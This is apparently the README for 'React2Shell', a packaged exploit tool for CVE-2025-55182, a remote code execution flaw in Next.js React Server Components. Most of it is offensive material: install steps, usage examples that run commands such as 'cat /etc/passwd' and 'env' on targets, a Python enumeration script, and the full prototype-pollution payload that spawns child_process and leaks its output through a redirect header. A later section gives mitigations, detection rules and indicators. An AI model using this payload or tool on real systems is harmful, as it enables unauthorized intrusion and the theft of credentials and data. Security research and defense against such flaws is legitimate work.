# CVE-2025-55182 – React2Shell 🔥

<p align="center">
  <img
    src="https://raw.githubusercontent.com/moovendhan-v/cve-tools/main/cve_2025_55182/assets/banner.jpg?v1"
    alt="React2Shell Banner"
    width="800"
  />
</p>

---

**React2Shell** is a security research tool that exploits  
**CVE-2025-55182**, a **Remote Code Execution (RCE)** vulnerability in  
**Next.js React Server Components (RSC)**.


This tool allows authorized security testers to execute system commands on vulnerable Next.js applications by abusing the RSC action handling and redirect mechanism.

---

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is designed exclusively for:
- Authorized penetration testing
- Security research in controlled environments
- Vulnerability assessment with explicit permission

**Unauthorized use is illegal and unethical.** Users are solely responsible for compliance with all applicable laws and regulations. The authors assume no liability for misuse.

---

## 📌 Vulnerability Overview

- **CVE ID**: CVE-2025-55182  
- **Affected Technology**: Next.js (React Server Components)
- **Impact**: Remote Code Execution (RCE)
- **Attack Vector**: Crafted multipart RSC action request
- **Severity**: Critical
- **Discovery Credit**: Moovendhan V

### Technical Details

The vulnerability exploits a flaw in Next.js React Server Components action handling:

1. **Prototype Pollution**: Manipulates the `__proto__` chain
2. **Process Injection**: Injects commands via `process.mainModule.require`
3. **Redirect Hijacking**: Exfiltrates output through the `NEXT_REDIRECT` digest mechanism
4. **Response Extraction**: Parses command output from redirect headers

🔗 **NVD Reference**: https://nvd.nist.gov/vuln/detail/CVE-2025-55182

---

## 🚀 Features

- ✅ **Reliable RCE exploitation** - Consistent command execution
- ✅ **Clean CLI interface** - Simple, intuitive command-line usage
- ✅ **Colored output** - Clear visual feedback with execution results
- ✅ **Minimal dependencies** - Only requires `requests` library
- ✅ **Easy integration** - Seamless integration into recon/automation pipelines
- ✅ **Professional design** - Built for security researchers & red teamers
- ✅ **Error handling** - Comprehensive error detection and reporting
- ✅ **URL normalization** - Automatic HTTPS prefix handling

---

## 📦 Installation

### Via pip (Recommended)

```bash
pip install CYBERTECHMIND-CVE-2025-55182
```

### From Source

```bash
# Clone the repository
git clone https://github.com/cybertechmind/react2shell.git
cd react2shell

# Install dependencies
pip install -r requirements.txt

# Install the package
pip install -e .
```

### Requirements

- Python 3.7+
- `requests` library
- Internet connectivity (for target testing)

#### requirements.txt

```txt
requests>=2.28.0
urllib3>=1.26.0
```

---

## 🛠️ Usage

### Basic Syntax

```bash
react2shell -t <TARGET_URL> -c <COMMAND>
```

### Required Arguments

| Argument | Short | Description | Example |
|----------|-------|-------------|---------|
| `--target` | `-t` | Target Next.js application URL | `https://example.com` |
| `--command` | `-c` | System command to execute | `whoami` |

### Examples

#### 1. Basic Command Execution

```bash
react2shell -t https://vulnerable-app.com -c "whoami"
```

**Output:**
```
    ▌     ▗     ▌    ▘   ▌         
▛▘▌▌▛▌█▌▛▘▜▘█▌▛▘▛▌▛▛▌▌▛▌▛▌  ▛▘▛▌▛▛▌
▙▖▙▌▙▌▙▖▌ ▐▖▙▖▙▖▌▌▌▌▌▌▌▌▙▌▗ ▙▖▙▌▌▌▌
  ▄▌                               

[CVE-2025-55182 RSC-RCE Exploit]
CVE-2025-55182
Author : Moovendhan V
Website : www.cybertechmind.com

[*] EXPLOITATION PARAMETERS
TARGET  : https://vulnerable-app.com
PAYLOAD : whoami

[+] EXPLOITATION SUCCESSFUL
 ▸ www-data
```

#### 2. System Information Gathering

```bash
react2shell -t target.example.com -c "uname -a"
```

**Expected Output:**
```
[+] EXPLOITATION SUCCESSFUL
 ▸ Linux webserver 5.15.0-86-generic #96-Ubuntu SMP x86_64 GNU/Linux
```

#### 3. File System Exploration

```bash
react2shell -t https://target.com -c "ls -la /var/www"
```

#### 4. Environment Variables

```bash
react2shell -t https://target.com -c "env"
```

#### 5. Network Configuration

```bash
react2shell -t https://target.com -c "ifconfig"
```

#### 6. Process Listing

```bash
react2shell -t https://target.com -c "ps aux"
```

#### 7. Read Sensitive Files

```bash
react2shell -t https://target.com -c "cat /etc/passwd"
```

#### 8. Check User Privileges

```bash
react2shell -t https://target.com -c "id"
```

---

## 📋 Configuration Options

### ExploitConfig Class

The tool uses an internal configuration class with the following parameters:

```python
class ExploitConfig:
    target_url: str      # Target URL (auto-normalized)
    payload_cmd: str     # Command to execute
    timeout: int = 15    # Request timeout in seconds
```

### Advanced Usage (Python API)

For integration into custom scripts:

```python
from cybertechmind_cve_2025_55182.core import (
    ExploitConfig,
    ExploitEngine,
    BannerDisplay
)

# Initialize configuration
config = ExploitConfig()
config.target_url = "https://vulnerable-app.com"
config.payload_cmd = "whoami"
config.timeout = 20  # Custom timeout

# Execute exploit
engine = ExploitEngine(config)
success, status, data = engine.execute()

if success:
    print(f"Command output: {data}")
else:
    print(f"Failed: {status} - {data}")
```

### Custom Script Example

```python
#!/usr/bin/env python3
import sys
from cybertechmind_cve_2025_55182.core import (
    ExploitConfig,
    ExploitEngine
)

def enumerate_target(url):
    """Run multiple reconnaissance commands"""
    commands = [
        "whoami",
        "hostname",
        "pwd",
        "uname -a",
        "id"
    ]
    
    results = {}
    
    for cmd in commands:
        config = ExploitConfig()
        config.target_url = url
        config.payload_cmd = cmd
        
        engine = ExploitEngine(config)
        success, status, data = engine.execute()
        
        if success:
            results[cmd] = data
        else:
            results[cmd] = f"Failed: {status}"
    
    return results

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"
    info = enumerate_target(target)
    
    print("\n=== Target Enumeration Results ===")
    for cmd, output in info.items():
        print(f"\n[{cmd}]")
        print(output)
```

---

## 🔍 How It Works

### Exploitation Flow

```
1. Payload Generation
   └─> Craft malicious RSC action payload
       └─> Inject prototype pollution
           └─> Execute command via child_process

2. Request Construction
   └─> Build multipart/form-data request
       └─> Set Next-Action header
           └─> POST to target endpoint

3. Response Parsing
   └─> Extract X-Action-Redirect header
       └─> Parse redirect URL parameters
           └─> Decode command output

4. Output Display
   └─> Format and display results
```

### Detailed Technical Breakdown

#### Step 1: Payload Generation

The exploit generates a specially crafted JSON payload that:

```javascript
{
  "then": "$1:__proto__:then",              // Prototype pollution trigger
  "status": "resolved_model",
  "reason": -1,
  "value": "{\\"then\\":\\"$B1337\\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process')
                .execSync('COMMAND').toString().trim()
                .replace(/\\n/g, ' | ');
                throw Object.assign(new Error('NEXT_REDIRECT'),
                {digest:`NEXT_REDIRECT;push;/login?a=${res};307;`});"
  },
  "_formData": {
    "get": "$1:constructor:constructor"      // Constructor access
  }
}
```

#### Step 2: Request Headers

```http
POST /target-endpoint HTTP/1.1
Host: vulnerable-app.com
Next-Action: x
Content-Type: multipart/form-data; boundary=----CyberTechMindBoundary
Content-Length: [calculated]

------CyberTechMindBoundary
Content-Disposition: form-data; name="0"

[PAYLOAD]
------CyberTechMindBoundary--
```

#### Step 3: Response Handling

The exploit extracts output from the redirect header:

```http
HTTP/1.1 307 Temporary Redirect
X-Action-Redirect: /login?a=www-data;307;
```

The parameter `a` contains the URL-encoded command output.

---

## 🎨 Output Format

### Success Output

```
    ▌     ▗     ▌    ▘   ▌         
▛▘▌▌▛▌█▌▛▘▜▘█▌▛▘▛▌▛▛▌▌▛▌▛▌  ▛▘▛▌▛▛▌
▙▖▙▌▙▌▙▖▌ ▐▖▙▖▙▖▌▌▌▌▌▌▌▌▙▌▗ ▙▖▙▌▌▌▌
  ▄▌                               

[CVE-2025-55182 RSC-RCE Exploit]
CVE-2025-55182
Author : Moovendhan V
Website : www.cybertechmind.com

[*] EXPLOITATION PARAMETERS
TARGET  : https://vulnerable-app.com
PAYLOAD : whoami

[+] EXPLOITATION SUCCESSFUL
 ▸ www-data
```

### Failure Output

```
[X] EXPLOIT FAILED
failed — HTTP 404
```

### Color Coding

- **Green**: Successful exploitation
- **Blue**: Configuration information
- **Cyan**: Target and payload details
- **Red**: Errors and failures
- **Yellow**: Warnings

---

## 🐛 Troubleshooting

### Common Issues

#### 1. Target Not Responding

```bash
[X] EXPLOIT FAILED
request_error — Connection timeout
```

**Solutions:**
- Verify target URL is accessible
- Check network connectivity
- Increase timeout: modify `ExploitConfig.timeout`
- Verify firewall rules allow outbound connections

#### 2. Command Not Executing

```bash
[X] EXPLOIT FAILED
failed — HTTP 200
```

**Possible Causes:**
- Target is not vulnerable to CVE-2025-55182
- Target has been patched
- WAF/security controls blocking requests
- Incorrect target endpoint

**Debugging Steps:**
```bash
# Test basic connectivity
curl -v https://target.com

# Check if RSC endpoints exist
curl -H "Next-Action: x" https://target.com -v
```

#### 3. SSL Certificate Errors

The tool automatically disables SSL verification. If you encounter SSL errors with custom configurations:

```python
# Already handled in the code:
verify=False
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
```

#### 4. Special Characters in Commands

Commands with quotes or special characters are automatically sanitized:

```python
# The tool handles:
# - Backslashes: \\ -> \\\\
# - Single quotes: ' -> \'
# - Newlines: removed

# Example:
react2shell -t https://target.com -c "echo 'Hello World'"
# Automatically sanitized before execution
```

#### 5. URL Format Issues

```bash
# Both formats work:
react2shell -t https://target.com -c "whoami"
react2shell -t target.com -c "whoami"  # Auto-adds https://
```

#### 6. Permission Denied

```bash
[+] EXPLOITATION SUCCESSFUL
 ▸ permission denied
```

**Explanation:** Command executed but lacks permissions. Try:
- Different commands that don't require elevated privileges
- Check what user context the app runs under

---

## 🔒 Security Considerations

### For Defenders

**Mitigation Strategies:**

1. **Update Next.js**: Upgrade to patched versions immediately
   ```bash
   npm update next
   # or
   yarn upgrade next
   ```

2. **Input Validation**: Implement strict RSC action validation
   ```javascript
   // Example validation middleware
   export async function validateAction(formData) {
     // Reject payloads with prototype pollution attempts
     const dangerous = ['__proto__', 'constructor', 'prototype'];
     const data = JSON.stringify(formData);
     
     for (const pattern of dangerous) {
       if (data.includes(pattern)) {
         throw new Error('Malicious payload detected');
       }
     }
   }
   ```

3. **WAF Rules**: Deploy rules to detect malicious RSC payloads
   - Block requests with `Next-Action` header and suspicious payloads
   - Monitor for prototype pollution patterns

4. **Network Segmentation**: Limit RSC endpoint exposure
   - Use authentication for all RSC endpoints
   - Implement rate limiting

5. **Monitoring**: Log and alert on suspicious RSC requests
   ```javascript
   // Log all RSC actions
   if (headers['next-action']) {
     logger.warn('RSC Action detected', {
       ip: req.ip,
       payload: req.body,
       timestamp: new Date()
     });
   }
   ```

### Detection Signatures

#### Snort/Suricata Rule

```
alert http any any -> any any (
  msg:"Possible CVE-2025-55182 Exploit Attempt";
  content:"Next-Action|3a| x";
  content:"__proto__";
  content:"mainModule.require";
  classtype:web-application-attack;
  sid:2025551820;
  rev:1;
)
```

#### ModSecurity Rule

```
SecRule REQUEST_HEADERS:Next-Action "@rx ^x$" \
  "id:2025551820,\
   phase:2,\
   block,\
   log,\
   msg:'CVE-2025-55182 RSC RCE Attempt',\
   chain"
SecRule REQUEST_BODY "@rx (__proto__|mainModule\.require)" \
  "setvar:tx.anomaly_score=+5"
```

### Indicators of Compromise (IOCs)

#### Network Indicators
- POST requests with `Next-Action: x` header
- Multipart form data containing `__proto__`
- References to `process.mainModule.require`
- Redirect headers with encoded command output
- Suspicious user agents: "python-requests"

#### Log Patterns
```
POST /api/action HTTP/1.1
Next-Action: x
Content-Type: multipart/form-data

[Payload contains: __proto__, mainModule, child_process]
```

#### File System Indicators
- Unexpected command execution in Next.js logs
- New processes spawned by Node.js server
- Unauthorized file access

---

## 📚 Project Structure

```
react2shell/
│
├── cybertechmind_cve_2025_55182/
│   ├── __init__.py
│   ├── core.py                 # Main exploit engine
│   └── cli.py                  # Command-line interface
│
├── __assets/
│   └── banner.jpg              # Tool banner
│
├── tests/
│   ├── test_exploit.py
│   └── test_payload.py
│
├── examples/
│   ├── basic_usage.py
│   └── advanced_automation.py
│
├── README.md                   # This file
├── LICENSE                     # MIT License
├── setup.py                    # Package setup
├── requirements.txt            # Dependencies
└── .gitignore
```

---

## 🧪 Testing

### Unit Tests

```bash
# Run all tests
python -m pytest tests/

# Run specific test
python -m pytest tests/test_exploit.py -v

# With coverage
python -m pytest --cov=cybertechmind_cve_2025_55182 tests/
```

### Manual Testing

```bash
# Test against vulnerable lab environment
react2shell -t http://localhost:3000 -c "whoami"

# Test with various commands
for cmd in "whoami" "hostname" "pwd"; do
  react2shell -t http://target.local -c "$cmd"
done
```

---

## 📖 Additional Resources

### Related Links

- **Author Profile**: https://profile.cybertechmind.com
- **Website**: https://www.cybertechmind.com
- **CVE Details**: https://nvd.nist.gov/vuln/detail/CVE-2025-55182
- **Next.js Security**: https://nextjs.org/docs/app/building-your-application/configuring/security

### Further Reading

- [React Server Components Architecture](https://react.dev/reference/rsc/server-components)
- [Next.js Action Handling](https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions-and-mutations)
- [Prototype Pollution Attacks](https://portswigger.net/web-security/prototype-pollution)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)

### Video Tutorials

Coming soon:
- Tool demonstration
- Exploitation walkthrough
- Defense strategies

---

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

### How to Contribute

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/improvement`)
3. Commit changes (`git commit -am 'Add new feature'`)
4. Push to branch (`git push origin feature/improvement`)
5. Open a Pull Request

### Code Style

- Follow PEP 8 guidelines
- Add docstrings to functions
- Include type hints where appropriate
- Write unit tests for new features

### Reporting Issues

Found a bug or have a suggestion? Open an issue on GitHub with:

- **Detailed description** of the problem
- **Steps to reproduce** the issue
- **Expected vs actual behavior**
- **Environment details** (OS, Python version, package version)
- **Logs or error messages** (if applicable)

---

## 📄 License

This project is licensed under the MIT License:

```
MIT License

Copyright (c) 2025 Moovendhan V

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 🎯 Roadmap

### Version 1.1 (Planned)

- [ ] Multi-threading support for bulk testing
- [ ] Output formats (JSON, XML, CSV)
- [ ] Interactive shell mode
- [ ] Proxy support (HTTP/SOCKS)
- [ ] Custom header injection

### Version 1.2 (Future)

- [ ] GUI interface
- [ ] Automated vulnerability scanning
- [ ] Report generation
- [ ] Integration with Metasploit
- [ ] Docker container support

---

## 📊 Statistics

![GitHub stars](https://img.shields.io/github/stars/cybertechmind/react2shell?style=social)
![GitHub forks](https://img.shields.io/github/forks/cybertechmind/react2shell?style=social)
![PyPI downloads](https://img.shields.io/pypi/dm/CYBERTECHMIND-CVE-2025-55182)
![Python versions](https://img.shields.io/pypi/pyversions/CYBERTECHMIND-CVE-2025-55182)
![License](https://img.shields.io/github/license/cybertechmind/react2shell)

---

## 👨‍💻 Author

**Moovendhan V**

- 🌐 Website: https://www.cybertechmind.com
- 👤 Profile: https://profile.cybertechmind.com
- 🔧 Tool: React2Shell v1.0
- 🐛 CVE: CVE-2025-55182

---

## 🙏 Acknowledgments

- Next.js security team for responsible disclosure process
- Security research community for testing and feedback
- All contributors and testers
- MITRE Corporation for CVE assignment
- NVD for vulnerability database

---

## 📞 Support

For support, security concerns, or professional inquiries:

- **Website**: www.cybertechmind.com
- **Email**: Contact through website
- **Issues**: GitHub Issues section
- **Security**: Report vulnerabilities responsibly

---

## ⚡ Quick Start Guide

```bash
# 1. Install the tool
pip install CYBERTECHMIND-CVE-2025-55182

# 2. Basic usage
react2shell -t https://target.com -c "whoami"

# 3. System enumeration
react2shell -t https://target.com -c "uname -a"

# 4. File exploration
react2shell -t https://target.com -c "ls -la"
```

---

## 🔐 Responsible Disclosure

If you discover a vulnerability in this tool or have security concerns:

1. **Do not** open a public issue
2. Contact the author privately through the website
3. Provide detailed information about the vulnerability
4. Allow reasonable time for a fix before public disclosure

---

## 📝 Changelog

### v1.0.0 (Initial Release)
- Initial public release
- Core RCE exploitation functionality
- CLI interface with colored output
- Automatic URL normalization
- Error handling and timeout support
- Documentation and examples

---

**Remember: With great power comes great responsibility. Use this tool ethically and legally.**

---

<div align="center">

**React2Shell** | CVE-2025-55182

Made with ❤️ by [Moovendhan V](https://www.cybertechmind.com)

*Last Updated: December 2025*  
*Version: 1.0*

</div>